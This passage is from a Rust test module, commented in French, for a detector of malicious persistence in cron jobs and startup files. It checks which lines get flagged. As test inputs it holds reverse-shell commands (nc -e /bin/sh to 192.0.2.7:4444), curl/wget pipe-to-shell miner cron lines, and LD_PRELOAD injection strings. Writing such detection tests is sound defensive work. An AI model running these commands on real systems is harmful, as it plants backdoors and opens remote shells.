            "@reboot (nc -e /bin/sh 192.0.2.7 4444 &)",
            "* * * * * cd /tmp;nc -e /bin/sh 192.0.2.7 4444",
            "* * * * * true&&ncat -c bash 192.0.2.7 4444",
            "@reboot { /usr/bin/nc -e /bin/sh 192.0.2.7 4444; }",
            "sh -c '`netcat -e /bin/sh 192.0.2.7 4444`'",
        ] {
            assert!(commande_suspecte(ligne, false).is_some(), "{ligne}");
        }
        assert!(commande_suspecte("curl -fsSL https://x.example/a | sh", false).is_some());
        assert!(commande_suspecte("wget -qO- http://x | /bin/bash", false).is_some());
        assert!(commande_suspecte("echo aGk= | base64 -d | sh", false).is_some());
        // La ligne de cron des mineurs (TeamTNT, Kinsing), telle qu'ils la posent : le téléchargeur entre parenthèses,
        // curl ou à défaut wget, passé à sh.
        for cron in [
            "*/30 * * * * root (curl -fsSL http://192.0.2.7/a.sh||wget -q -O- http://192.0.2.7/a.sh)|sh",
            "*/30 * * * * (curl -fsSL http://192.0.2.7/a.sh||wget -q -O- http://192.0.2.7/a.sh)|sh",
            "* * * * * (curl -fsSL http://192.0.2.7/a.sh)|bash",
            "@reboot $(curl -fsSL http://192.0.2.7/a.sh)|sh",
            "* * * * * cd /tmp;wget -q -O- http://192.0.2.7/a.sh|sudo -u root sh",
        ] {
            assert_eq!(
                commande_suspecte(cron, false),
                Some(tr!(
                    "télécharge un script et l'exécute aussitôt",
                    "downloads a script and runs it right away"
                )),
                "{cron}"
            );
        }
        // Pas des portes dérobées : curl sans exécution, nc sans shell, grep après curl.
        assert!(commande_suspecte("curl -fsS https://x/a.json | jq .", false).is_none());
        assert!(commande_suspecte("nc -z 10.0.0.1 22", false).is_none());
        assert!(commande_suspecte("(nc -z 10.0.0.1 22 && echo ok)", false).is_none());
        assert!(commande_suspecte("export TMPDIR=/tmp/moi", false).is_none());
        // Programme lancé depuis /tmp ou un dossier caché : seulement pour une commande lancée.
        assert!(commande_suspecte("/tmp/.x/run --daemon", true).is_some());
        assert!(commande_suspecte("-/dev/shm/a", true).is_some());
        assert!(commande_suspecte("~/.cache/.u/agent", true).is_some());
        assert!(commande_suspecte("%h/.mozilla/x", true).is_some());
        assert!(commande_suspecte("~/.local/bin/plein-ecran", true).is_none());
        assert!(commande_suspecte("%h/.cargo/bin/vanguard surveiller", true).is_none());
        assert!(commande_suspecte("/usr/bin/xrandr --output DP-1", true).is_none());
        assert!(commande_suspecte("cd /tmp/x", false).is_none());
    }

    /// Le fichier qui lance un programme, tel qu'il est montré : court sous le dossier personnel, et inoffensif.
    #[test]
    fn fichiers_de_demarrage_montres() {
        let maison = Path::new("/home/alice");
        assert_eq!(
            court(Path::new("/home/alice/.config/autostart/x.desktop"), maison),
            "~/.config/autostart/x.desktop"
        );
        assert_eq!(court(Path::new("/etc/profile.d/a.sh"), maison), "/etc/profile.d/a.sh");
        assert_eq!(
            court(
                Path::new("/home/alice/.config/autostart/x\x1b]0;t\x07\x1b[2K\r\u{202e}.desktop"),
                maison
            ),
            "~/.config/autostart/x�]0;t��[2K��.desktop"
        );
    }

    #[test]
    fn lignes_de_demarrage() {
        assert_eq!(
            commande_lancee("ExecStart=-/usr/bin/foo -x").as_deref(),
            Some("-/usr/bin/foo -x")
        );
        assert_eq!(
            commande_lancee("Exec=steam -silent %U").as_deref(),
            Some("steam -silent %U")
        );
        assert_eq!(commande_lancee("exec-once = waybar").as_deref(), Some("waybar"));
        assert_eq!(
            commande_lancee(r#"o.exec_on_start("~/.local/bin/plein-ecran")"#).as_deref(),
            Some("~/.local/bin/plein-ecran")
        );
        assert_eq!(commande_lancee(r#"-- o.launch_on_start("my-service")"#), None);
        assert_eq!(commande_lancee("# ExecStart=/tmp/x"), None);
        assert_eq!(commande_lancee("Description=Exec=/tmp/x"), None);
        assert_eq!(commande_lancee("Name=Steam"), None);
        assert!(definit_prechargement("export LD_PRELOAD=/home/x/.l/libz.so"));
        assert!(definit_prechargement("env = LD_PRELOAD,/tmp/a.so"));
        assert!(!definit_prechargement("unset LD_PRELOAD"));
        assert!(!definit_prechargement("# LD_PRELOAD=/x"));
    }
}
